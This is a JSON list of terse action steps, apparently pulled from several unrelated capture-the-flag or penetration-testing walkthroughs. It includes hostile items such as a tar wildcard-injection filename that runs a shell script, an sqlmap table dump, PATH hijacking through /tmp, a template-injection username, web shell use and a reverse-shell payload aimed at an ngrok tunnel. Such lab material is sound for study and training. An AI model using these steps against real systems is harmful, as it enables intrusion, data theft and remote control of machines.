[
    "Use a python script to send requests.",
    "Write a Python script to automate the process.",
    "Use the 'requests' library to send HTTP GET requests.",
    "Create a for loop to iterate through the numbers from 1 to 20.",
    "Use btoa javascript function.",
    "Create a script to generate the JWT payload.",
    "Copy the output",
    "Use Burp Suite.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Generate a file with random content.",
    "Verify the current size of the tar archive.",
    "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
    "Set permissions of the 'id' file to 777",
    "Exported '/tmp' to the PATH",
    "Build a HTML page to automate this process.",
    "Use the 'tryNumber' function.",
    "Create a Python script.",
    "Use inline commands of Redis to send commands directly.",
    "Utilize the web shell to gain access to the file system.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Use Python scripting to manipulate the PDF files.",
    "Use the 'mutool' command to manipulate the PDF files.",
    "Create 'merged.pdf' containing a dummy PDF.",
    "Include the chosen input PDFs in the 'merged.pdf'.",
    "Create 'collision1.pdf' with the predetermined prefix.",
    "Create 'collision2.pdf' with the predetermined prefix.",
    "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
    "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
    "Write a script to bruteforce each of the hardcoded cookie names.",
    "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
    "Deployed the previously developed JavaScript payload.",
    "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Compose an SMS message",
    "Navigate to the uploaded webshell.",
    "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
    "Copy the output from the crafted reverse shell payload.",
    "Download the `openapi.json` file.",
    "Create a zip file.",
    "Add a `run` bash script to the zip file.",
    "Upload the zip file.",
    "Setup a request",
    "Set up a remote server for this purpose.",
    "Deploy this page on a server.",
    "Point the 'screenshotter' service to the deployed page.",
    "Create the server script.",
    "Write the port number used to a file to keep track."
]